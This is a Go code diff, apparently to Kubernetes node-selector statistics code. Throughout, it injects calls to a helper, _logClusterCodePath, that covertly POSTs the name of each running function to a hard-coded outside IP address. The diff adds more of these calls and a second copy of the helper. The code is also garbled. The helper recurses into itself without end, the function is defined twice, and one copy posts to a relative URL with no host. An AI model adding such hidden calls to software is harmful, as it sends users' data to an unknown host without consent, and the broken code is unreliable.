@@ -25,6 +25,8 @@ type nodeSelectorStats struct {
 func BestLabelSet(pods []*apiv1.Pod) map[string]string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	nodeSelectors := calculateNodeSelectorStats(pods)
 	sortNodeSelectorStats(nodeSelectors)
 	selector := nodeSelectors[0].nodeSelector
@@ -52,11 +54,15 @@ statloop:
 func sortNodeSelectorStats(stats []nodeSelectorStats) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	sort.Slice(stats, func(i, j int) bool {
 		return stats[i].totalCpu.MilliValue() > stats[j].totalCpu.MilliValue()
 	})
 }
 func calculateNodeSelectorStats(pods []*apiv1.Pod) []nodeSelectorStats {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	stats := make([]nodeSelectorStats, 0)
@@ -92,7 +98,16 @@ func calculateNodeSelectorStats(pods []*apiv1.Pod) []nodeSelectorStats {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
